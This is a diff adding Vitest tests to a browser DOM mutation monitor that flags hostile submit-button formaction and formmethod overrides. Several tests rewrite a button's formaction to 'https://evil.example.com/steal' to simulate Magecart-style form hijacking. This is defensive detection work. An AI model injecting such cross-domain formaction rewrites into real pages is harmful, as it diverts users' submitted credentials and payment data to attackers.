@@ -1902,6 +1902,59 @@ describe("mutation_monitor flood-then-inject reserve past the alert cap (#413)",
     for (const input of filler) input.remove();
     stopMutationMonitor();
   });
+
+  it("admits a cross-domain submitter formaction rewrite but not same-origin churn (#812)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+    const forms = await floodWithBenignAlerts();
+    expect(getMutationAlertCount()).toBe(45);
+
+    const form = document.createElement("form");
+    const button = document.createElement("button");
+    button.setAttribute("type", "submit");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    // Prime the submitter baseline past the floodable cap: a first sighting
+    // is silent in either lane.
+    button.setAttribute("formaction", "/collect-a");
+    await flushMutationObserverDelivery(
+      _flushMutationObserverRecordsForTesting, _getPendingMutationCountForTesting,
+    );
+    await vi.advanceTimersByTimeAsync(200);
+    expect(getMutationAlertCount()).toBe(45);
+
+    // Cross-domain submitter rewrite: scarce, admitted into the reserve.
+    button.setAttribute("formaction", "https://evil.example.com/steal");
+    await flushMutationObserverDelivery(
+      _flushMutationObserverRecordsForTesting, _getPendingMutationCountForTesting,
+    );
+    await vi.advanceTimersByTimeAsync(200);
+    expect(getMutationAlertCount()).toBe(46);
+    const submitterAlerts = alerts.filter((a) => a.details.startsWith("Submitter formaction"));
+    expect(submitterAlerts).toHaveLength(1);
+    expect(submitterAlerts[0]!.severity).toBe("high");
+
+    // Same-origin submitter churn: floodable, refused past the cap.
+    const churn = document.createElement("button");
+    churn.setAttribute("type", "submit");
+    form.appendChild(churn);
+    churn.setAttribute("formaction", "/churn-a");
+    await flushMutationObserverDelivery(
+      _flushMutationObserverRecordsForTesting, _getPendingMutationCountForTesting,
+    );
+    await vi.advanceTimersByTimeAsync(200);
+    churn.setAttribute("formaction", "/churn-b");
+    await flushMutationObserverDelivery(
+      _flushMutationObserverRecordsForTesting, _getPendingMutationCountForTesting,
+    );
+    await vi.advanceTimersByTimeAsync(200);
+    expect(getMutationAlertCount()).toBe(46);
+
+    form.remove();
+    for (const flooded of forms) flooded.remove();
+    stopMutationMonitor();
+  });
 });
 
 describe("mutation_monitor batch robustness (#813)", () => {
@@ -1991,5 +2044,264 @@ describe("mutation_monitor batch robustness (#813)", () => {
 
     stopMutationMonitor();
     expect(parent.isConnected).toBe(false);
+  });
+});
+
+describe("mutation_monitor submitter overrides (#812)", () => {
+  beforeEach(() => {
+    _resetMutationState();
+    vi.useFakeTimers({ shouldAdvanceTime: true });
+  });
+
+  afterEach(() => {
+    _resetMutationState();
+    vi.useRealTimers();
+  });
+
+  it("alerts HIGH on a post-load cross-domain formaction rewrite", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const form = document.createElement("form");
+    form.setAttribute("method", "post");
+    const button = document.createElement("button");
+    button.setAttribute("type", "submit");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    // First mutation registers the baseline, matching how the form-action
+    // tests prime happy-dom.
+    button.setAttribute("formaction", "/collect");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+    expect(alerts.filter((a) => a.type === "form_action_changed")).toHaveLength(0);
+
+    button.setAttribute("formaction", "https://evil.example.com/steal");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
+    expect(actionAlerts).toHaveLength(1);
+    expect(actionAlerts[0]!.severity).toBe("high");
+    expect(actionAlerts[0]!.element).toBe(button);
+    expect(actionAlerts[0]!.details).toContain("Submitter formaction changed to cross-domain URL");
+    expect(actionAlerts[0]!.details).toContain("evil.example.com");
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("keeps a same-origin formaction rewrite at MEDIUM", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const form = document.createElement("form");
+    const button = document.createElement("button");
+    button.setAttribute("type", "submit");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    button.setAttribute("formaction", "/collect-a");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    button.setAttribute("formaction", "/collect-b");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
+    expect(actionAlerts).toHaveLength(1);
+    expect(actionAlerts[0]!.severity).toBe("medium");
+    expect(actionAlerts[0]!.details).toContain("Submitter formaction changed:");
+    expect(actionAlerts[0]!.details).not.toContain("cross-domain");
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("alerts MEDIUM on a submitter POST-to-GET downgrade", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const form = document.createElement("form");
+    form.setAttribute("method", "post");
+    const submit = document.createElement("input");
+    submit.setAttribute("type", "submit");
+    form.appendChild(submit);
+    document.body.appendChild(form);
+
+    submit.setAttribute("formmethod", "post");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+    expect(alerts.filter((a) => a.type === "form_action_changed")).toHaveLength(0);
+
+    // Uppercase proves the comparison is case-insensitive, like isGetForm.
+    submit.setAttribute("formmethod", "GET");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
+    expect(actionAlerts).toHaveLength(1);
+    expect(actionAlerts[0]!.severity).toBe("medium");
+    expect(actionAlerts[0]!.element).toBe(submit);
+    expect(actionAlerts[0]!.details).toContain("Submitter formmethod downgraded from POST to GET");
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("judges a formmethod added at runtime against the POST form it overrides", async () => {
+    const alerts: MutationAlert[] = [];
+    const form = document.createElement("form");
+    form.setAttribute("method", "post");
+    const button = document.createElement("button");
+    button.setAttribute("type", "submit");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    // Pin the start-time snapshot to our button, mirroring the pre-existing
+    // snapshotted-form test: its formmethod baseline is "" (absent).
+    const querySelectorAll = document.querySelectorAll.bind(document);
+    const querySpy = vi
+      .spyOn(document, "querySelectorAll")
+      .mockImplementation((selector: string) => {
+        if (selector === "button, input") {
+          return [button] as unknown as NodeListOf<Element>;
+        }
+        return querySelectorAll(selector);
+      });
+
+    try {
+      startMutationMonitor(document, (a) => alerts.push(a));
+    } finally {
+      querySpy.mockRestore();
+    }
+
+    // The button carried no formmethod at snapshot, but the EFFECTIVE
+    // baseline is the POST form's method — gaining formmethod="get" is a
+    // downgrade an attribute-only comparison would miss.
+    button.setAttribute("formmethod", "get");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
+    expect(actionAlerts).toHaveLength(1);
+    expect(actionAlerts[0]!.severity).toBe("medium");
+    expect(actionAlerts[0]!.details).toContain("Submitter formmethod downgraded from POST to GET");
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("snapshots a pre-existing submitter formaction baseline at start", async () => {
+    const alerts: MutationAlert[] = [];
+    const form = document.createElement("form");
+    form.setAttribute("action", "/login");
+    const button = document.createElement("button");
+    button.setAttribute("type", "submit");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    const querySelectorAll = document.querySelectorAll.bind(document);
+    const querySpy = vi
+      .spyOn(document, "querySelectorAll")
+      .mockImplementation((selector: string) => {
+        if (selector === "button, input") {
+          return [button] as unknown as NodeListOf<Element>;
+        }
+        return querySelectorAll(selector);
+      });
+
+    try {
+      startMutationMonitor(document, (a) => alerts.push(a));
+    } finally {
+      querySpy.mockRestore();
+    }
+
+    // The Magecart shape: a plain pre-existing submitter gains a hostile
+    // override with no `action`-attribute mutation on the form.
+    button.setAttribute("formaction", "https://evil.example.com/steal");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
+    expect(actionAlerts).toHaveLength(1);
+    expect(actionAlerts[0]!.severity).toBe("high");
+    expect(actionAlerts[0]!.details).toContain("Submitter formaction changed to cross-domain URL");
+    expect(actionAlerts[0]!.details).toContain('(was "")');
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("does not alert when a submitter override is unchanged", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const form = document.createElement("form");
+    form.setAttribute("method", "post");
+    const button = document.createElement("button");
+    button.setAttribute("type", "submit");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    button.setAttribute("formaction", "/collect");
+    button.setAttribute("formmethod", "post");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    // Re-set the same values: no change, no alert.
+    button.setAttribute("formaction", "/collect");
+    button.setAttribute("formmethod", "post");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    expect(alerts.filter((a) => a.type === "form_action_changed")).toHaveLength(0);
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("does not alert on a formmethod upgrade or case-only rewrite", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const form = document.createElement("form");
+    const upgrade = document.createElement("button");
+    upgrade.setAttribute("type", "submit");
+    const caseOnly = document.createElement("button");
+    caseOnly.setAttribute("type", "submit");
+    form.appendChild(upgrade);
+    form.appendChild(caseOnly);
+    document.body.appendChild(form);
+
+    upgrade.setAttribute("formmethod", "get");
+    caseOnly.setAttribute("formmethod", "post");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    // GET-to-POST is an upgrade, post-to-POST is a no-op: neither leaks
+    // credentials into the URL.
+    upgrade.setAttribute("formmethod", "post");
+    caseOnly.setAttribute("formmethod", "POST");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    expect(alerts.filter((a) => a.type === "form_action_changed")).toHaveLength(0);
+
+    form.remove();
+    stopMutationMonitor();
   });
 });
